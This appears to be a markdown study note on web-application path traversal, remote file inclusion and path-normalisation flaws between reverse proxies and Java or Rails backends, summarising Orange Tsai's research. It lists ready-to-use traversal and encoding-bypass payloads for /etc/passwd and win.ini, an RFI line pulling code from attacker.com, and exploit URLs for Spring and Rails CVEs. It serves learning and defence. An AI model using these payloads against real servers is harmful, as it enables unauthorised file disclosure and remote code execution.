# Web Application Architecture:
![image](https://github.com/user-attachments/assets/588af6f9-b2af-4757-9a35-81e58f08b69e)



---

### **1. Path Traversal Vulnerabilities**
Path traversal vulnerabilities allow attackers to access arbitrary files on a server by manipulating file paths in user inputs, such as URL parameters.

#### **Exploitation Techniques**
- **Regular Case**:
  - Relative paths: `../../../../../../etc/passwd` (Unix) or `..\..\..\..\..\..\windows\win.ini` (Windows).
  - Absolute paths: `/etc/passwd`.

- **Non-Recursive Stripping**:
  - Bypassing filters that strip `../` or `..\\` non-recursively:
    - `....//....//....//etc/passwd`
    - `../../../etc/passwd%00` (null byte to terminate path).

- **URL Encoding**:
  - Single encoding: `../` as `%2e%2e%2f`.
  - Double encoding: `../` as `%25%32%65%25%32%65%25%32%66`.
  - Example: `%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64` for `../../../etc/passwd`.

- **Bypass Start of Path Validation**:
  - Prepending valid paths: `/var/www/images/../../../etc/passwd` or `/var/www/html/..//..//..//etc/passwd`.

- **Null Byte for Extension Validation**:
  - Append `%00` to bypass extension checks: `../../../etc/passwd%00.png`.
  - Non-standard encodings:
    - `.` = `%2e`, `%u002e`, `%c0%2e`, `%e0%40%ae`, `%c0ae`.
    - `/` = `%2f`, `%u2215`, `%c0%af`, `%e0%80%af`, `%c0%2f`.
    - `\` = `%5c`, `%u2216`, `%c0%5c`, `%c0%80%5c`.
    - Double URL: `%252e`, `%252f`, `%255c`.

#### **Example**
```
https://insecure-website.com/loadImage?filename=../../../etc/passwd
```
This could allow an attacker to read sensitive files like `/etc/passwd`.

---

### **2. Remote File Inclusion (RFI)**
RFI occurs when an application dynamically includes external files based on user input, allowing attackers to include malicious scripts from remote servers.

#### **Exploitation**
- Example: `include.php?page=http://attacker.com/exploit.php`
  - The application fetches and executes the remote script, potentially leading to **Remote Code Execution (RCE)**.
- Often exploited in applications with poor input validation for file inclusion parameters.

#### **Key Difference from Path Traversal**
- Path traversal targets local files on the server.
- RFI targets external files, enabling attackers to execute arbitrary code hosted remotely.

---

### **3. Parser Logic Flaws and Path Normalization Issues**
Orange Tsai’s presentation highlights how inconsistencies in **path normalization** across web application components (e.g., reverse proxies, Java backends) create vulnerabilities. These issues often lead to path traversal or RCE, especially in multi-layered architectures.

#### **Key Vulnerabilities**
1. **Inconsistent Path Parsing**:
   - Different components (e.g., Nginx, Apache, Tomcat) interpret paths differently:
     - Windows vs. Linux: `file:///etc/passwd?/../../Windows/win.ini` may be treated as a URL on Linux but a UNC path on Windows.
     - Proxies may decode `%2e%2e%2f` before forwarding, while backends fail to re-sanitize.
   - Example: `/..;/` is treated as a directory by some proxies (e.g., Nginx, Apache), bypassing ACLs or context mappings.

2. **Nginx Off-by-Slash**:
   - Misconfigured `alias` directive:
     ```
     location /static {
         alias /home/app/static/;
     }
     ```
     - Request: `http://127.0.0.1/static../settings.py`
     - Result: Nginx appends `../settings.py` to `/home/app/static/`, resolving to `/home/app/settings.py`.

3. **Java Frameworks**:
   - **Spring (CVE-2018-1271)**:
     - Flawed `cleanPath` function allows traversal with double slashes (`/foo//../` → `/foo/`).
     - Exploit: `http://0:8080/spring-rabbit-stock/static/%255c%255c%255c%255c%255c%255c..%255c..%255c..%255c..%255c..%255c..%255c/Windows/win.ini`.
   - **Rails (CVE-2018-3760)**:
     - Sprockets supports `file://` scheme, bypassing absolute path checks.
     - Double encoding (`%252e%252e`) and query string injection (`%3F`) allow RCE via ERB templates:
       ```
       http://127.0.0.1:3000/assets/file:%2f%2f/app/assets/images/%252e%252e/%252e%252e/%252e%252e/etc/passwd
       ```
       ```
       http://127.0.0.1:3000/assets/file:%2f%2f/app/assets/images/%252e%252e/%252e%252e/%252e%252e/tmp/evil.erb%3ftype=text/plain
       ```

4. **Reverse Proxy Issues**:
   - **Apache mod_jk, mod_proxy, Nginx ProxyPass**:
     - These components often fail to normalize paths consistently with the backend, allowing traversal sequences like `/..;/` to bypass restrictions.
     - Example: `http://example.com/portal/..;/manager/html` accesses the Tomcat management console by exploiting proxy-backend mismatches.

5. **Case Studies**:
   - **Uber**: Bypassed SSO whitelist with `/status/..;/secure/Dashboard.jspa`.
   - **Bynder**: RCE via `/..;/railo-context/admin/web.cfm` and log injection.
   - **Amazon**: RCE on Nuxeo by chaining path normalization bugs, Seam Framework EL injection, and blacklist bypass.

#### **Why These Architectures Are Vulnerable**
- **Reverse Proxy + Java Backend**:
  - Proxies (Apache mod_jk, mod_proxy, Nginx ProxyPass) may forward unnormalized or partially normalized paths to Java backends (e.g., Tomcat, Jetty).
  - Java backends often trust proxies to sanitize inputs, leading to vulnerabilities when proxies misinterpret paths like `/..;/` or double-encoded sequences.
- **Parser Inconsistencies**:
  - Proxies and backends handle URL parameters, encodings, and separators differently, creating exploitable gaps.
  - Example: Tomcat strips `;foo` from `/login;foo/bar`, while proxies may pass it unchanged.
- **Default Configurations**:
  - Default settings prioritize compatibility, leaving weak sanitization or no checks for edge cases like `%00` or UTF-8 encodings.

---



